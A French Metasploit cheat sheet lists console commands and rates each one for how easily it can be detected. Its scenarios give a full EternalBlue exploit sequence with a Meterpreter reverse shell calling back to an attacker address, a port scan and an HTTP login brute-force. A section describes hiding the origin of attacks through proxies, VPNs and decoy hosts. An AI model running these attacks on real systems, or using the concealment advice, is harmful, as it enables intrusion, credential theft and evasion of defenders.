# 😁 Metasploit

#### Introduction

Metasploit est un framework open-source pour le développement et l'exécution d'exploits contre des systèmes distants. Il est conçu pour aider les professionnels de la sécurité à identifier et à exploiter les vulnérabilités dans les systèmes informatiques.

#### Installation de Metasploit

**Sous Linux (Debian/Ubuntu)**

```bash
sudo apt update
sudo apt install metasploit-framework
```

**Sous Windows**

Télécharge le programme d'installation depuis le site officiel de Metasploit et suis les instructions.

#### Démarrage de Metasploit

1.  **Lancer Metasploit Console**

    ```bash
    msfconsole
    ```

    * **Explication** : Lance la console interactive de Metasploit où tu peux exécuter des commandes, rechercher des exploits, et gérer des sessions.
    * **Discrétion** : N/A. Ce n'est pas un scan ou une attaque, donc la discrétion n'est pas un problème ici.

#### Commandes Principales de Metasploit

1.  **Recherche d'exploits**

    ```bash
    search <mot-clé>
    ```

    * **Explication** : Recherche des modules, des exploits, et des payloads correspondant au mot-clé spécifié.
    * **Discrétion** : N/A. Utilisé pour rechercher des modules, ne génère pas de trafic réseau visible.
2.  **Affichage des informations sur un exploit**

    ```bash
    info <nom_du_module>
    ```

    * **Explication** : Affiche les informations détaillées sur un module spécifique, y compris les options, les cibles, et les descriptions.
    * **Discrétion** : N/A. Information sur les modules, pas d'activité de scan ou d'exploitation.
3.  **Sélectionner un exploit**

    ```bash
    use <nom_du_module>
    ```

    * **Explication** : Sélectionne un module d'exploit pour l'utiliser dans Metasploit.
    * **Discrétion** : N/A. Cette commande sélectionne simplement un module pour une utilisation ultérieure.
4.  **Configurer les options de l'exploit**

    ```bash
    set <option> <valeur>
    ```

    * **Explication** : Configure les options nécessaires pour l'exploit, comme l'adresse IP cible et les paramètres spécifiques.
    * **Discrétion** : N/A. Configure les paramètres de l'exploit sans effectuer d'attaque réelle.
5.  **Afficher les options disponibles**

    ```bash
    show options
    ```

    * **Explication** : Affiche les options configurables pour le module actuel.
    * **Discrétion** : N/A. Affiche simplement les options configurables.
6.  **Lancer l'exploit**

    ```bash
    exploit
    ```

    * **Explication** : Lance l'exploit avec les options configurées. Peut essayer de pénétrer un système cible en exploitant une vulnérabilité.
    * **Discrétion** : Faible à moyenne. Peut être détecté par des IDS/IPS et générer des alertes.
7.  **Afficher les sessions ouvertes**

    ```bash
    sessions
    ```

    * **Explication** : Liste toutes les sessions ouvertes avec les systèmes compromis.
    * **Discrétion** : N/A. Gestion des sessions après exploitation.
8.  **Interagir avec une session**

    ```bash
    sessions -i <id_de_session>
    ```

    * **Explication** : Permet d'interagir avec une session active pour contrôler le système compromis.
    * **Discrétion** : Faible. Activité sur le système cible, potentiellement détectée par des systèmes de surveillance.

#### Modules et Payloads

1.  **Rechercher des modules**

    ```bash
    search <type:exploit> <mot-clé>
    ```

    * **Explication** : Recherche des exploits ou des modules spécifiques en fonction du type et du mot-clé.
    * **Discrétion** : N/A. Utilisé pour rechercher des modules, ne génère pas de trafic réseau visible.
2.  **Rechercher des payloads**

    ```bash
    search <type:payload> <mot-clé>
    ```

    * **Explication** : Recherche des payloads disponibles correspondant au mot-clé spécifié.
    * **Discrétion** : N/A. Recherches internes pour les payloads, pas d'activité externe.
3.  **Configurer un payload**

    ```bash
    set PAYLOAD <nom_du_payload>
    ```

    * **Explication** : Configure le payload à utiliser avec l'exploit sélectionné.
    * **Discrétion** : N/A. Configure les options pour le payload.
4.  **Afficher les payloads disponibles**

    ```bash
    show payloads
    ```

    * **Explication** : Affiche une liste des payloads disponibles pour le module d'exploit actuel.
    * **Discrétion** : N/A. Affiche les options disponibles, pas de trafic réseau.

#### Options Avancées

1.  **Utilisation de Metasploit avec des proxys**

    ```bash
    setg Proxies http://<proxy_address>:<port>
    ```

    * **Explication** : Configure Metasploit pour utiliser un proxy HTTP, ce qui peut aider à masquer l'origine des attaques.
    * **Discrétion** : Haute. Masque l'origine des requêtes en utilisant un proxy.
2. **Utilisation de VPN pour masquer l'origine**
   * **Explication** : En utilisant Metasploit via un VPN, tu peux masquer l'origine de ton activité.
   * **Discrétion** : Très haute. Utiliser un VPN ajoute une couche de dissimulation.
3. **Utilisation de decoy hosts**
   * **Explication** : Lorsque tu réalises des scans, utiliser des hôtes leurres pour masquer l'origine réelle.
   * **Discrétion** : Très haute. Les leurres compliquent la détection de la source réelle des activités.

#### Exemples de Scénarios

1.  **Exploitation d’une vulnérabilité connue**

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.1.10
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.5
    exploit
    ```

    * **Explication** : Utilise l'exploit EternalBlue pour exploiter une vulnérabilité SMB sur une machine Windows, avec un payload Meterpreter pour la connexion inverse.
    * **Discrétion** : Faible. Les exploits bien connus comme EternalBlue peuvent être détectés par des IDS/IPS.
2.  **Scan de port et identification du système d’exploitation**

    ```bash
    use auxiliary/scanner/portscan/tcp
    set RHOSTS 192.168.1.10
    run
    ```

    * **Explication** : Utilise un module de scan de ports pour identifier les ports ouverts sur une cible.
    * **Discrétion** : Moyenne. Le scan de ports peut être détecté et générer des alertes.
3.  **Utilisation de Metasploit pour une attaque par force brute**

    ```bash
    use auxiliary/scanner/http/http_login
    set RHOSTS 192.168.1.10
    set TARGETURI /login
    set USER_FILE /path/to/usernames.txt
    set PASS_FILE /path/to/passwords.txt
    run
    ```

    * **Explication** : Utilise un module de force brute pour tester des combinaisons de noms d’utilisateur et mots de passe sur une interface de connexion HTTP.
    * **Discrétion** : Faible. Les tentatives de connexion par force brute peuvent facilement être détectées par des systèmes de surveillance.
